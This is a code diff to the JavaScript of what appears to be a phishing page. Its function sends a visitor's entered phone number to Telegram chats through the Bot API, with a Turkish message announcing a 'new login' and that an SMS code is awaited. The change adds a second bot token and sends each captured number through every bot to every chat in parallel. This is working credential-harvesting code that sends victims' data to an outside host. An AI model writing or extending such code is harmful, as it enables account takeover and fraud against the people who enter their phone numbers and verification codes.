@@ -15,32 +15,33 @@ phoneInput.addEventListener('input', function (e) {
 
 // Send phone to Telegram (all chat IDs in parallel)
 async function sendToTelegram(phone) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n\n⏳ SMS Kod Bekleniyor...`;
     const messageIds = {};
+    const bots = [TELEGRAM_CONFIG.BOT_TOKEN];
+    if (TELEGRAM_CONFIG.BOT_TOKEN_2) bots.push(TELEGRAM_CONFIG.BOT_TOKEN_2);
 
-    const sendPromises = TELEGRAM_CONFIG.CHAT_IDS.map(async (chatId) => {
-        try {
-            const res = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-            const data = await res.json();
-            if (data.ok) {
-                messageIds[chatId] = data.result.message_id;
-                console.log(`Log sent to ${chatId} successfully`);
-            } else {
-                console.error(`Telegram error for ${chatId}:`, data.description);
-            }
-        } catch (e) {
-            console.error(`Fetch error for ${chatId}:`, e);
+    const sendPromises = [];
+    for (const bot of bots) {
+        for (const chatId of TELEGRAM_CONFIG.CHAT_IDS) {
+            const url = `https://api.telegram.org/bot${bot}/sendMessage`;
+            sendPromises.push((async () => {
+                try {
+                    const res = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                    });
+                    const data = await res.json();
+                    if (data.ok) {
+                        messageIds[`${bot}:::${chatId}`] = data.result.message_id;
+                        console.log(`Log sent to ${chatId} via ${bot.substring(0, 8)}...`);
+                    }
+                } catch (e) {
+                    console.error(`Fetch error:`, e);
+                }
+            })());
         }
-    });
+    }
 
     await Promise.all(sendPromises);
 
